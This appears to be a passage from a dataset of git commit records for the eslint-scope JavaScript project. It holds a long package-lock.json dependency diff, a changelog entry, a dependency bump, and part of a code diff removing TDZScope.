""3.2.3""<c><\n>+          ""resolved"": ""https://registry.npmjs.org/supports-color/-/supports-color-3.2.3.tgz""<c><\n>+          ""integrity"": ""sha1-ZawFBLOVQXHYpklGsq48u4pfVPY=""<c><\n>+          ""dev"": true<c><\n>+          ""requires"": {<\n>+            ""has-flag"": ""1.0.0""<\n>+          }<\n>+        }<\n>+      }<\n>+    }<c><\n>+    ""js-base64"": {<\n>+      ""version"": ""2.4.3""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/js-base64/-/js-base64-2.4.3.tgz""<c><\n>+      ""integrity"": ""sha512-H7ErYLM34CvDMto3GbD6xD0JLUGYXR3QTcH6B/tr4Hi/QpSThnCsIp+Sy5FRTw3B0d6py4HcNkW7nO/wdtGWEw==""<c><\n>+      ""dev"": true<\n>+    }<c><\n>+    ""js-tokens"": {<\n>+      ""version"": ""3.0.2""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/js-tokens/-/js-tokens-3.0.2.tgz""<c><\n>+      ""integrity"": ""sha1-mGbfOVECEw449/mWvOtlRDIJwls=""<c><\n>+      ""dev"": true<\n>+    }<c><\n>+    ""js-yaml"": {<\n>+      ""version"": ""3.11.0""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/js-yaml/-/js-yaml-3.11.0.tgz""<c><\n>+      ""integrity"": ""sha512-saJstZWv7oNeOyBh3+Dx1qWzhW0+e6/8eDzo7p5rDFqxntSztloLtuKu+Ejhtq82jsilwOIZYsCz+lIjthg1Hw==""<c><\n>+      ""dev"": true<c><\n>+      ""requires"": {<\n>+        ""argparse"": ""1.0.10""<c><\n>+        ""esprima"": ""4.0.0""<\n>+      }<\n>+    }<c><\n>+    ""json-parse-better-errors"": {<\n>+      ""version"": ""1.0.2""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/json-parse-better-errors/-/json-parse-better-errors-1.0.2.tgz""<c><\n>+      ""integrity"": ""sha512-mrqyZKfX5EhL7hvqcV6WG1yYjnjeuYDzDhhcAAUrq8Po85NBQBJP+ZDUT75qZQ98IkUoBqdkExkukOU7Ts2wrw==""<c><\n>+      ""dev"": true<\n>+    }<c><\n>+    ""json-stable-stringify"": {<\n>+      ""version"": ""1.0.1""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/json-stable-stringify/-/json-stable-stringify-1.0.1.tgz""<c><\n>+      ""integrity"": ""sha1-mnWdOcXy/1A/1TAGRu1EX4jE+a8=""<c><\n>+      ""dev"": true<c><\n>+      ""requires"": {<\n>+        ""jsonify"": ""0.0.0""<\n>+      }<\n>+    }<c><\n>+    ""json3"": {<\n>+      ""version"": ""3.3.2""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/json3/-/json3-3.3.2.tgz""<c><\n>+      ""integrity"": ""sha1-PAQ0dD35Pi9cQq7nsZvLSDV19OE=""<c><\n>+      ""dev"": true<\n>+    }<c><\n>+    ""jsonify"": {<\n>+      ""version"": ""0.0.0""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/jsonify/-/jsonify-0.0.0.tgz""<c><\n>+      ""integrity"": ""sha1-LHS27kHZPKUbe1qu6PUDYx0lKnM=""<c><\n>+      ""dev"": true<\n>+    }<c><\n>+    ""jsonpointer"": {<\n>+      ""version"": ""4.0.1""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/jsonpointer/-/jsonpointer-4.0.1.tgz""<c><\n>+      ""integrity"": ""sha1-T9kss04OnbPInIYi7PUfm5eMbLk=""<c><\n>+      ""dev"": true<\n>+    }<c><\n>+    ""kind-of"": {<\n>+      ""version"": ""3.2.2""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/kind-of/-/kind-of-3.2.2.tgz""<c><\n>+      ""integrity"": ""sha1-MeohpzS6ubuw8yRm2JOupR5KPGQ=""<c><\n>+      ""dev"": true<c><\n>+      ""requires"": {<\n>+        ""is-buffer"": ""1.1.6""<\n>+      }<\n>+    }<c><\n>+    ""lazy-cache"": {<\n>+      ""version"": ""1.0.4""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/lazy-cache/-/lazy-cache-1.0.4.tgz""<c><\n>+      ""integrity"": ""sha1-odePw6UEdMuAhF07O24dpJpEbo4=""<c><\n>+      ""dev"": true<c><\n>+      ""optional"": true<\n>+    }<c><\n>+    ""levn"": {<\n>+      ""version"": ""0.3.0""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/levn/-/levn-0.3.0.tgz""<c><\n>+      ""integrity"": ""sha1-OwmSTt+fCDwEkP3UwLxEIeBHZO4=""<c><\n>+      ""dev"": true<c><\n>+      ""requires"": {<\n>+        ""prelude-ls"": ""1.1.2""<c><\n>+        ""type-check"": ""0.3.2""<\n>+      }<\n>+    }<c><\n>+    ""linefix"": {<\n>+      ""version"": ""0.1.1""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/linefix/-/linefix-0.1.1.tgz""<c><\n>+      ""integrity"": ""sha1-WB9UspNf++nfJVdw8Ko7A0E4I5M=""<c><\n>+      ""dev"": true<\n>+    }<c><\n>+    ""load-json-file"": {<\n>+      ""version"": ""1.1.0""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/load-json-file/-/load-json-file-1.1.0.tgz""<c><\n>+      ""integrity"": ""sha1-lWkFcI1YtLq0wiYbBPWfMcmTdMA=""<c><\n>+      ""dev"": true<c><\n>+      ""requires"": {<\n>+        ""graceful-fs"": ""4.1.11""<c><\n>+        ""parse-json"": ""2.2.0""<c><\n>+        ""pify"": ""2.3.0""<c><\n>+        ""pinkie-promise"": ""2.0.1""<c><\n>+        ""strip-bom"": ""2.0.0""<\n>+      }<c><\n>+      ""dependencies"": {<\n>+        ""strip-bom"": {<\n>+          ""version"": ""2.0.0""<c><\n>+          ""resolved"": ""https://registry.npmjs.org/strip-bom/-/strip-bom-2.0.0.tgz""<c><\n>+          ""integrity"": ""sha1-YhmoVhZSBJHzV4i9vxRHqZx+aw4=""<c><\n>+          ""dev"": true<c><\n>+          ""requires"": {<\n>+            ""is-utf8"": ""0.2.1""<\n>+          }<\n>+        }<\n>+      }<\n>+    }<c><\n>+    ""lodash"": {<\n>+      ""version"": ""4.17.10""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/lodash/-/lodash-4.17.10.tgz""<c><\n>+      ""integrity"": ""sha512-UejweD1pDoXu+AD825lWwp4ZGtSwgnpZxb3JDViD7StjQz+Nb/6l093lx4OQ0foGWNRoc19mWy7BzL+UAK2iVg==""<c><\n>+      ""dev"": true<\n>+    }<c><\n>+    ""lodash._baseassign"": {<\n>+      ""version"": ""3.2.0""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/lodash._baseassign/-/lodash._baseassign-3.2.0.tgz""<c><\n>+      ""integrity"": ""sha1-jDigmVAPIVrQnlnxci/QxSv+Ck4=""<c><\n>+      ""dev"": true<c><\n>+      ""requires"": {<\n>+        ""lodash._basecopy"": ""3.0.1""<c><\n>+        ""lodash.keys"": ""3.1.2""<\n>+      }<\n>+    }<c><\n>+    ""lodash._basecopy"": {<\n>+      ""version"": ""3.0.1""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/lodash._basecopy/-/lodash._basecopy-3.0.1.tgz""<c><\n>+      ""integrity"": ""sha1-jaDmqHbPNEwK2KVIghEd08XHyjY=""<c><\n>+      ""dev"": true<\n>+    }<c><\n>+    ""lodash._basecreate"": {<\n>+      ""version"": ""3.0.3""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/lodash._basecreate/-/lodash._basecreate-3.0.3.tgz""<c><\n>+      ""integrity"": ""sha1-G8ZhYU2qf8MRt9A78WgGoCE8+CE=""<c><\n>+      ""dev"": true<\n>+    }<c><\n>+    ""lodash._getnative"": {<\n>+      ""version"": ""3.9.1""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/lodash._getnative/-/lodash._getnative-3.9.1.tgz""<c><\n>+      ""integrity"": ""sha1-VwvH3t5G1hzc3mh9ZdPuy6o6r/U=""<c><\n>+      ""dev"": true<\n>+    }<c><\n>+    ""lodash._isiterateecall"": {<\n>+      ""version"": ""3.0.9""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/lodash._isiterateecall/-/lodash._isiterateecall-3.0.9.tgz""<c><\n>+      ""integrity"": ""sha1-UgOte6Ql+uhCRg5pbbnPPmqsBXw=""<c><\n>+      ""dev"": true<\n>+    }<c><\n>+    ""lodash.create"": {<\n>+      ""version"": ""3.1.1""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/lodash.create/-/lodash.create-3.1.1.tgz""<c><\n>+      ""integrity"": ""sha1-1/KEnw29p+BGgruM1yqwIkYd6+c=""<c><\n>+      ""dev"": true<c><\n>+      ""requires"": {<\n>+        ""lodash._baseassign"": ""3.2.0""<c><\n>+        ""lodash._basecreate"": ""3.0.3""<c><\n>+        ""lodash._isiterateecall"": ""3.0.9""<\n>+      }<\n>+    }<c><\n>+    ""lodash.isarguments"": {<\n>+      ""version"": ""3.1.0""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/lodash.isarguments/-/lodash.isarguments-3.1.0.tgz""<c><\n>+      ""integrity"": ""sha1-L1c9hcaiQon/AGY7SRwdM4/zRYo=""<c><\n>+      ""dev"": true<\n>+    }<c><\n>+    ""lodash.isarray"": {<\n>+      ""version"": ""3.0.4""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/lodash.isarray/-/lodash.isarray-3.0.4.tgz""<c><\n>+      ""integrity"": ""sha1-eeTriMNqgSKvhvhEqpvNhRtfu1U=""<c><\n>+      ""dev"": true<\n>+    }<c><\n>+    ""lodash.keys"": {<\n>+      ""version"": ""3.1.2""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/lodash.keys/-/lodash.keys-3.1.2.tgz""<c><\n>+      ""integrity"": ""sha1-TbwEcrFWvlCgsoaFXRvQsMZWCYo=""<c><\n>+      ""dev"": true<c><\n>+      ""requires"": {<\n>+        ""lodash._getnative"": ""3.9.1""<c><\n>+        ""lodash.isarguments"": ""3.1.0""<c><\n>+        ""lodash.isarray"": ""3.0.4""<\n>+      }<\n>+    }<c><\n>+    ""lodash.tostring"": {<\n>+      ""version"": ""4.1.4""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/lodash.tostring/-/lodash.tostring-4.1.4.tgz""<c><\n>+      ""integrity"": ""sha1-Vgwn0fjq3eA8LM4Zj+9cAx2CmPs=""<c><\n>+      ""dev"": true<\n>+    }<c><\n>+    ""lodash.unescape"": {<\n>+      ""version"": ""4.0.0""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/lodash.unescape/-/lodash.unescape-4.0.0.tgz""<c><\n>+      ""integrity"": ""sha1-Nt6/xJK4FHhHHvl0zTeD4gLrbO8=""<c><\n>+      ""dev"": true<c><\n>+      ""requires"": {<\n>+        ""lodash.tostring"": ""4.1.4""<\n>+      }<\n>+    }<c><\n>+    ""longest"": {<\n>+      ""version"": ""1.0.1""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/longest/-/longest-1.0.1.tgz""<c><\n>+      ""integrity"": ""sha1-MKCy2jj3N3DoKUoNIuZiXtd9AJc=""<c><\n>+      ""dev"": true<\n>+    }<c><\n>+    ""loud-rejection"": {<\n>+      ""version"": ""1.6.0""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/loud-rejection/-/loud-rejection-1.6.0.tgz""<c><\n>+      ""integrity"": ""sha1-W0b4AUft7leIcPCG0Eghz5mOVR8=""<c><\n>+      ""dev"": true<c><\n>+      ""requires"": {<\n>+        ""currently-unhandled"": ""0.4.1""<c><\n>+        ""signal-exit"": ""3.0.2""<\n>+      }<\n>+    }<c><\n>+    ""map-obj"": {<\n>+      ""version"": ""1.0.1""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/map-obj/-/map-obj-1.0.1.tgz""<c><\n>+      ""integrity"": ""sha1-2TPOuSBdgr3PSIb2dCvcK03qFG0=""<c><\n>+      ""dev"": true<\n>+    }<c><\n>+    ""meow"": {<\n>+      ""version"": ""3.7.0""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/meow/-/meow-3.7.0.tgz""<c><\n>+      ""integrity"": ""sha1-cstmi0JSKCkKu/qFaJJYcwioAfs=""<c><\n>+      ""dev"": true<c><\n>+      ""requires"": {<\n>+        ""camelcase-keys"": ""2.1.0""<c><\n>+        ""decamelize"": ""1.2.0""<c><\n>+        ""loud-rejection"": ""1.6.0""<c><\n>+        ""map-obj"": ""1.0.1""<c><\n>+        ""minimist"": ""1.2.0""<c><\n>+        ""normalize-package-data"": ""2.4.0""<c><\n>+        ""object-assign"": ""4.1.1""<c><\n>+        ""read-pkg-up"": ""1.0.1""<c><\n>+        ""redent"": ""1.0.0""<c><\n>+        ""trim-newlines"": ""1.0.0""<\n>+      }<c><\n>+      ""dependencies"": {<\n>+        ""minimist"": {<\n>+          ""version"": ""1.2.0""<c><\n>+          ""resolved"": ""https://registry.npmjs.org/minimist/-/minimist-1.2.0.tgz""<c><\n>+          ""integrity"": ""sha1-o1AIsg9BOD7sH7kU9M1d95omQoQ=""<c><\n>+          ""dev"": true<\n>+        }<\n>+      }<\n>+    }<c><\n>+    ""minimatch"": {<\n>+      ""version"": ""3.0.4""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/minimatch/-/minimatch-3.0.4.tgz""<c><\n>+      ""integrity"": ""sha512-yJHVQEhyqPLUTgt9B83PXu6W3rx4MvvHvSUvToogpwoGDOUQ+yDrR0HRot+yOCdCO7u4hX3pWft6kWBBcqh0UA==""<c><\n>+      ""dev"": true<c><\n>+      ""requires"": {<\n>+        ""brace-expansion"": ""1.1.11""<\n>+      }<\n>+    }<c><\n>+    ""minimist"": {<\n>+      ""version"": ""0.0.8""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/minimist/-/minimist-0.0.8.tgz""<c><\n>+      ""integrity"": ""sha1-hX/Kv8M5fSYluCKCYuhqp6ARsF0=""<c><\n>+      ""dev"": true<\n>+    }<c><\n>+    ""mkdirp"": {<\n>+      ""version"": ""0.5.1""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/mkdirp/-/mkdirp-0.5.1.tgz""<c><\n>+      ""integrity"": ""sha1-MAV0OOrGz3+MR2fzhkjWaX11yQM=""<c><\n>+      ""dev"": true<c><\n>+      ""requires"": {<\n>+        ""minimist"": ""0.0.8""<\n>+      }<\n>+    }<c><\n>+    ""mocha"": {<\n>+      ""version"": ""3.5.3""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/mocha/-/mocha-3.5.3.tgz""<c><\n>+      ""integrity"": ""sha512-/6na001MJWEtYxHOV1WLfsmR4YIynkUEhBwzsb+fk2qmQ3iqsi258l/Q2MWHJMImAcNpZ8DEdYAK72NHoIQ9Eg==""<c><\n>+      ""dev"": true<c><\n>+      ""requires"": {<\n>+        ""browser-stdout"": ""1.3.0""<c><\n>+        ""commander"": ""2.9.0""<c><\n>+        ""debug"": ""2.6.8""<c><\n>+        ""diff"": ""3.2.0""<c><\n>+        ""escape-string-regexp"": ""1.0.5""<c><\n>+        ""glob"": ""7.1.1""<c><\n>+        ""growl"": ""1.9.2""<c><\n>+        ""he"": ""1.1.1""<c><\n>+        ""json3"": ""3.3.2""<c><\n>+        ""lodash.create"": ""3.1.1""<c><\n>+        ""mkdirp"": ""0.5.1""<c><\n>+        ""supports-color"": ""3.1.2""<\n>+      }<c><\n>+      ""dependencies"": {<\n>+        ""debug"": {<\n>+          ""version"": ""2.6.8""<c><\n>+          ""resolved"": ""https://registry.npmjs.org/debug/-/debug-2.6.8.tgz""<c><\n>+          ""integrity"": ""sha1-5zFTHKLt4n0YgiJCfaF4IdaP9Pw=""<c><\n>+          ""dev"": true<c><\n>+          ""requires"": {<\n>+            ""ms"": ""2.0.0""<\n>+          }<\n>+        }<c><\n>+        ""glob"": {<\n>+          ""version"": ""7.1.1""<c><\n>+          ""resolved"": ""https://registry.npmjs.org/glob/-/glob-7.1.1.tgz""<c><\n>+          ""integrity"": ""sha1-gFIR3wT6rxxjo2ADBs31reULLsg=""<c><\n>+          ""dev"": true<c><\n>+          ""requires"": {<\n>+            ""fs.realpath"": ""1.0.0""<c><\n>+            ""inflight"": ""1.0.6""<c><\n>+            ""inherits"": ""2.0.3""<c><\n>+            ""minimatch"": ""3.0.4""<c><\n>+            ""once"": ""1.4.0""<c><\n>+            ""path-is-absolute"": ""1.0.1""<\n>+          }<\n>+        }<c><\n>+        ""supports-color"": {<\n>+          ""version"": ""3.1.2""<c><\n>+          ""resolved"": ""https://registry.npmjs.org/supports-color/-/supports-color-3.1.2.tgz""<c><\n>+          ""integrity"": ""sha1-cqJiiU2dQIuVbKBf83su2KbiotU=""<c><\n>+          ""dev"": true<c><\n>+          ""requires"": {<\n>+            ""has-flag"": ""1.0.0""<\n>+          }<\n>+        }<\n>+      }<\n>+    }<c><\n>+    ""ms"": {<\n>+      ""version"": ""2.0.0""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/ms/-/ms-2.0.0.tgz""<c><\n>+      ""integrity"": ""sha1-VgiurfwAvmwpAd9fmGF4jeDVl8g=""<c><\n>+      ""dev"": true<\n>+    }<c><\n>+    ""mute-stream"": {<\n>+      ""version"": ""0.0.5""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/mute-stream/-/mute-stream-0.0.5.tgz""<c><\n>+      ""integrity"": ""sha1-j7+rsKmKJT0xhDMfno3rc3L6xsA=""<c><\n>+      ""dev"": true<\n>+    }<c><\n>+    ""natural-compare"": {<\n>+      ""version"": ""1.4.0""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/natural-compare/-/natural-compare-1.4.0.tgz""<c><\n>+      ""integrity"": ""sha1-Sr6/7tdUHywnrPspvbvRXI1bpPc=""<c><\n>+      ""dev"": true<\n>+    }<c><\n>+    ""next-tick"": {<\n>+      ""version"": ""1.0.0""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/next-tick/-/next-tick-1.0.0.tgz""<c><\n>+      ""integrity"": ""sha1-yobR/ogoFpsBICCOPchCS524NCw=""<c><\n>+      ""dev"": true<\n>+    }<c><\n>+    ""nopt"": {<\n>+      ""version"": ""3.0.6""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/nopt/-/nopt-3.0.6.tgz""<c><\n>+      ""integrity"": ""sha1-xkZdvwirzU2zWTF/eaxopkayj/k=""<c><\n>+      ""dev"": true<c><\n>+      ""requires"": {<\n>+        ""abbrev"": ""1.1.1""<\n>+      }<\n>+    }<c><\n>+    ""nopt-usage"": {<\n>+      ""version"": ""0.1.0""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/nopt-usage/-/nopt-usage-0.1.0.tgz""<c><\n>+      ""integrity"": ""sha1-sYuMGD4YEEfKnmO3zefPxwLMpXk=""<c><\n>+      ""dev"": true<\n>+    }<c><\n>+    ""normalize-package-data"": {<\n>+      ""version"": ""2.4.0""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/normalize-package-data/-/normalize-package-data-2.4.0.tgz""<c><\n>+      ""integrity"": ""sha512-9jjUFbTPfEy3R/ad/2oNbKtW9Hgovl5O1FvFWKkKblNXoN/Oou6+9+KKohPK13Yc3/TyunyWhJp6gvRNR/PPAw==""<c><\n>+      ""dev"": true<c><\n>+      ""requires"": {<\n>+        ""hosted-git-info"": ""2.6.0""<c><\n>+        ""is-builtin-module"": ""1.0.0""<c><\n>+        ""semver"": ""5.5.0""<c><\n>+        ""validate-npm-package-license"": ""3.0.3""<\n>+      }<\n>+    }<c><\n>+    ""npm-license"": {<\n>+      ""version"": ""0.3.3""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/npm-license/-/npm-license-0.3.3.tgz""<c><\n>+      ""integrity"": ""sha1-9n9LwjyGP24GLN5jlBTgURbc24I=""<c><\n>+      ""dev"": true<c><\n>+      ""requires"": {<\n>+        ""mkdirp"": ""0.5.1""<c><\n>+        ""nopt"": ""3.0.6""<c><\n>+        ""nopt-usage"": ""0.1.0""<c><\n>+        ""package-license"": ""0.1.2""<c><\n>+        ""pkginfo"": ""0.3.1""<c><\n>+        ""read-installed"": ""4.0.3""<c><\n>+        ""treeify"": ""1.0.1""<c><\n>+        ""underscore"": ""1.4.4""<\n>+      }<\n>+    }<c><\n>+    ""number-is-nan"": {<\n>+      ""version"": ""1.0.1""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/number-is-nan/-/number-is-nan-1.0.1.tgz""<c><\n>+      ""integrity"": ""sha1-CXtgK1NCKlIsGvuHkDGDNpQaAR0=""<c><\n>+      ""dev"": true<\n>+    }<c><\n>+    ""object-assign"": {<\n>+      ""version"": ""4.1.1""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/object-assign/-/object-assign-4.1.1.tgz""<c><\n>+      ""integrity"": ""sha1-IQmtx5ZYh8/AXLvUQsrIv7s2CGM=""<c><\n>+      ""dev"": true<\n>+    }<c><\n>+    ""once"": {<\n>+      ""version"": ""1.4.0""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/once/-/once-1.4.0.tgz""<c><\n>+      ""integrity"": ""sha1-WDsap3WWHUsROsF9nFC6753Xa9E=""<c><\n>+      ""dev"": true<c><\n>+      ""requires"": {<\n>+        ""wrappy"": ""1.0.2""<\n>+      }<\n>+    }<c><\n>+    ""onetime"": {<\n>+      ""version"": ""1.1.0""<c><\n>+      ""resolved"": ""http://registry.npmjs.org/onetime/-/onetime-1.1.0.tgz""<c><\n>+      ""integrity"": ""sha1-ofeDj4MUxRbwXs78vEzP4EtO14k=""<c><\n>+      ""dev"": true<\n>+    }<c><\n>+    ""optimist"": {<\n>+      ""version"": ""0.6.1""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/optimist/-/optimist-0.6.1.tgz""<c><\n>+      ""integrity"": ""sha1-2j6nRob6IaGaERwybpDrFaAZZoY=""<c><\n>+      ""dev"": true<c><\n>+      ""requires"": {<\n>+        ""minimist"": ""0.0.8""<c><\n>+        ""wordwrap"": ""0.0.3""<\n>+      }<c><\n>+      ""dependencies"": {<\n>+        ""wordwrap"": {<\n>+          ""version"": ""0.0.3""<c><\n>+          ""resolved"": ""https://registry.npmjs.org/wordwrap/-/wordwrap-0.0.3.tgz""<c><\n>+          ""integrity"": ""sha1-o9XabNXAvAAI03I0u68b7WMFkQc=""<c><\n>+          ""dev"": true<\n>+        }<\n>+      }<\n>+    }<c><\n>+    ""optionator"": {<\n>+      ""version"": ""0.8.2""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/optionator/-/optionator-0.8.2.tgz""<c><\n>+      ""integrity"": ""sha1-NkxeQJ0/TWMB1sC0wFu6UBgK62Q=""<c><\n>+      ""dev"": true<c><\n>+      ""requires"": {<\n>+        ""deep-is"": ""0.1.3""<c><\n>+        ""fast-levenshtein"": ""2.0.6""<c><\n>+        ""levn"": ""0.3.0""<c><\n>+        ""prelude-ls"": ""1.1.2""<c><\n>+        ""type-check"": ""0.3.2""<c><\n>+        ""wordwrap"": ""1.0.0""<\n>+      }<\n>+    }<c><\n>+    ""os-homedir"": {<\n>+      ""version"": ""1.0.2""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/os-homedir/-/os-homedir-1.0.2.tgz""<c><\n>+      ""integrity"": ""sha1-/7xJiDNuDoM94MFox+8VISGqf7M=""<c><\n>+      ""dev"": true<\n>+    }<c><\n>+    ""package-license"": {<\n>+      ""version"": ""0.1.2""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/package-license/-/package-license-0.1.2.tgz""<c><\n>+      ""integrity"": ""sha1-9cRJp6UPrfSiI0HilJCZ+RpCAos=""<c><\n>+      ""dev"": true<\n>+    }<c><\n>+    ""parse-json"": {<\n>+      ""version"": ""2.2.0""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/parse-json/-/parse-json-2.2.0.tgz""<c><\n>+      ""integrity"": ""sha1-9ID0BDTvgHQfhGkJn43qGPVaTck=""<c><\n>+      ""dev"": true<c><\n>+      ""requires"": {<\n>+        ""error-ex"": ""1.3.1""<\n>+      }<\n>+    }<c><\n>+    ""path-exists"": {<\n>+      ""version"": ""2.1.0""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/path-exists/-/path-exists-2.1.0.tgz""<c><\n>+      ""integrity"": ""sha1-D+tsZPD8UY2adU3V77YscCJ2H0s=""<c><\n>+      ""dev"": true<c><\n>+      ""requires"": {<\n>+        ""pinkie-promise"": ""2.0.1""<\n>+      }<\n>+    }<c><\n>+    ""path-is-absolute"": {<\n>+      ""version"": ""1.0.1""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/path-is-absolute/-/path-is-absolute-1.0.1.tgz""<c><\n>+      ""integrity"": ""sha1-F0uSaHNVNP+8es5r9TpanhtcX18=""<c><\n>+      ""dev"": true<\n>+    }<c><\n>+    ""path-is-inside"": {<\n>+      ""version"": ""1.0.2""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/path-is-inside/-/path-is-inside-1.0.2.tgz""<c><\n>+      ""integrity"": ""sha1-NlQX3t5EQw0cEa9hAn+s8HS9/FM=""<c><\n>+      ""dev"": true<\n>+    }<c><\n>+    ""path-parse"": {<\n>+      ""version"": ""1.0.5""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/path-parse/-/path-parse-1.0.5.tgz""<c><\n>+      ""integrity"": ""sha1-PBrfhx6pzWyUMbbqK9dKD/BVxME=""<c><\n>+      ""dev"": true<\n>+    }<c><\n>+    ""path-type"": {<\n>+      ""version"": ""1.1.0""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/path-type/-/path-type-1.1.0.tgz""<c><\n>+      ""integrity"": ""sha1-WcRPfuSR2nBNpBXaWkBwuk+P5EE=""<c><\n>+      ""dev"": true<c><\n>+      ""requires"": {<\n>+        ""graceful-fs"": ""4.1.11""<c><\n>+        ""pify"": ""2.3.0""<c><\n>+        ""pinkie-promise"": ""2.0.1""<\n>+      }<\n>+    }<c><\n>+    ""pify"": {<\n>+      ""version"": ""2.3.0""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/pify/-/pify-2.3.0.tgz""<c><\n>+      ""integrity"": ""sha1-7RQaasBDqEnqWISY59yosVMw6Qw=""<c><\n>+      ""dev"": true<\n>+    }<c><\n>+    ""pinkie"": {<\n>+      ""version"": ""2.0.4""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/pinkie/-/pinkie-2.0.4.tgz""<c><\n>+      ""integrity"": ""sha1-clVrgM+g1IqXToDnckjoDtT3+HA=""<c><\n>+      ""dev"": true<\n>+    }<c><\n>+    ""pinkie-promise"": {<\n>+      ""version"": ""2.0.1""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/pinkie-promise/-/pinkie-promise-2.0.1.tgz""<c><\n>+      ""integrity"": ""sha1-ITXW36ejWMBprJsXh3YogihFD/o=""<c><\n>+      ""dev"": true<c><\n>+      ""requires"": {<\n>+        ""pinkie"": ""2.0.4""<\n>+      }<\n>+    }<c><\n>+    ""pkginfo"": {<\n>+      ""version"": ""0.3.1""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/pkginfo/-/pkginfo-0.3.1.tgz""<c><\n>+      ""integrity"": ""sha1-Wyn2qB9wcXFC4J52W76rl7T4HiE=""<c><\n>+      ""dev"": true<\n>+    }<c><\n>+    ""pluralize"": {<\n>+      ""version"": ""1.2.1""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/pluralize/-/pluralize-1.2.1.tgz""<c><\n>+      ""integrity"": ""sha1-0aIUg/0iu0HlihL6NCGCMUCJfEU=""<c><\n>+      ""dev"": true<\n>+    }<c><\n>+    ""prelude-ls"":","-  ""version"": ""3.7.1""<c><\n>",F
17,56,56,569,4,26,ESLint Jenkins <eslint@googlegroups.com>,-1,-1,-1,-1,-1,-1,-1,Fri,21,46,27 Apr 2018,Build: changelog update for 4.0.0-alpha.0,0,0,1,5,341,+v4.0.0-alpha.0 - April 27<c> 2018<\n>+* 7cc3769 Upgrade: eslint-release ^0.11.1 (#36) (Teddy Katz)<\n>+* c9f6967 Breaking: remove TDZScope (refs eslint/eslint#10245) (#35) (Toru Nagashima)<\n>+* 982a71f Fix: wrong resolution about default parameters (#33) (Toru Nagashima)<\n>+* 57889f1 Docs: Remove extra header line from LICENSE (#32) (Gyandeep Singh)<\n>,,F
17,56,56,569,4,26,Teddy Katz,75,10,128,0,User,0,1599,Fri,21,40,27 Apr 2018,Upgrade: eslint-release ^0.11.1 (#36),0,0,1,2,68,"+    ""eslint-release"": ""^0.11.1""<c><\n>","-    ""eslint-release"": ""^0.10.1""<c><\n>",F
17,56,56,569,4,26,Toru Nagashima,103,3,460,33,User,0,2574,Sat,10,35,28 Apr 2018,Breaking: remove TDZScope (refs eslint/eslint#10245) (#35),0,0,6,201,11390,"+            this.scopeManager.__nestForScope(node);<\n>+        }<\n>+        if (node.left.type === Syntax.VariableDeclaration) {<\n>+            this.visit(node.left);<\n>+            this.visitPattern(node.left.declarations[0].id<c> pattern => {<\n>+                this.currentScope().__referencing(pattern<c> Reference.WRITE<c> node.right<c> null<c> true<c> true);<\n>+            });<\n>+            this.visitPattern(node.left<c> { processRightHandNodes: true }<c> (pattern<c> info) => {<\n>+                let maybeImplicitGlobal = null;<\n>+                if (!this.currentScope().isStrict) {<\n>+                    maybeImplicitGlobal = {<\n>+                        pattern<c><\n>+                        node<\n>+                    };<\n>+                }<\n>+                this.referencingDefaultValue(pattern<c> info.assignments<c> maybeImplicitGlobal<c> false);<\n>+                this.currentScope().__referencing(pattern<c> Reference.WRITE<c> node.right<c> maybeImplicitGlobal<c> true<c> false);<\n>+            });<\n>+        this.visit(node.right);<\n>+        this.visit(node.body);<\n>+        this.close(node);<\n>+    visitVariableDeclaration(variableTargetScope<c> type<c> node<c> index) {<\n>+        this.visitPattern(decl.id<c> { processRightHandNodes: true }<c> (pattern<c> info) => {<\n>+           